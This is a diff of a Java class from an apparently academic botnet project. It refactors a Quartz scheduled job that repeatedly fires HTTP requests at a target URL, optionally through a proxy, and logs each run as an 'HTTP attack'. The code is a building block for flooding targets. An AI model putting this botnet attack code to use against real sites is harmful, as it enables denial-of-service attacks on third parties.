@@ -24,16 +24,12 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.attack.quartz;
+package com.acmutv.botnet.core.attack;
 
-import com.acmutv.botnet.core.attack.Attacker;
-import com.acmutv.botnet.core.target.HttpTarget;
 import com.acmutv.botnet.log.AppLogMarkers;
 import com.acmutv.botnet.tool.net.HttpManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
-import com.acmutv.botnet.tool.time.Duration;
-import com.acmutv.botnet.tool.time.Interval;
 import lombok.*;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -43,14 +39,13 @@ import java.io.IOException;
 import java.net.URL;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.concurrent.ThreadLocalRandom;
 
 /**
- * This class realizes the behaviour of a HTTP attack.
+ * A HTTP attack that can be executed by a {@link Scheduler}.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
- * @see HttpTarget
+ * @see HttpAttack
  */
 @Getter
 @PersistJobDataAfterExecution
@@ -59,57 +54,26 @@ public class QuartzHttpAttacker implements QuartzAttacker {
 
   protected static final Logger LOGGER = LogManager.getLogger(QuartzHttpAttacker.class);
 
-  /**
-   * The HTTP request method.
-   */
-  HttpMethod method;
-
-  /**
-   * The target url to attack.
-   */
-  URL url;
-
-  /**
-   * The HTTP proxy to contact through.
-   */
-  HttpProxy proxy;
-
-  /**
-   * The current execution counter.
-   */
-  long counter;
-
-  /**
-   * The maximum number of repetitions scheduled.
-   */
-  long maxRepetitions;
-
-  /**
-   * The HTTP request properties.
-   * Default is empty.
-   */
-  @NonNull
-  private Map<String,String> properties = new HashMap<>();
-
   @Override
   public void execute(JobExecutionContext context) throws JobExecutionException {
     JobDataMap jobmap = context.getJobDetail().getJobDataMap();
 
-    final HttpMethod method = this.getMethod();
-    final URL url = this.getUrl();
-    final HttpProxy proxy = this.getProxy();
-    final long counter = this.getCounter();
-    final long maxRepetitions = this.getMaxRepetitions();
+    final HttpMethod method = (HttpMethod) jobmap.get("method");
+    final URL target = (URL) jobmap.get("target");
+    final HttpProxy proxy = (HttpProxy) jobmap.get("proxy");
+    final Map<String,String> properties = (Map<String,String>) jobmap.get("properties");
+    final int counter = (int)jobmap.getOrDefault("counter", 1);
+    final int executions = jobmap.getInt("executions");
 
-    jobmap.put("counter", counter + 1);
+    jobmap.put("counter", counter+1);
 
     LOGGER.info(AppLogMarkers.ATTACK,
         "Launching HTTP attack: {} {} ({}/{}) with proxy {} and request properties {}",
-        method, url, counter, maxRepetitions, proxy, this.properties);
+        method, target, counter, executions, (proxy == null)?"none":proxy.toCompactString(), properties);
 
     try {
-      final int response = HttpManager.makeRequest(this.getMethod(), url, this.getProperties(), proxy);
-      LOGGER.info("HTTP Attack response :: {} {} :: {}", this.getMethod(), url, response);
+      final int response = HttpManager.makeRequest(method, target, properties, proxy);
+      LOGGER.info("HTTP Attack response :: {} {} :: {}", method, target, response);
     } catch (IOException exc) {
       LOGGER.warn(exc.getMessage());
     }
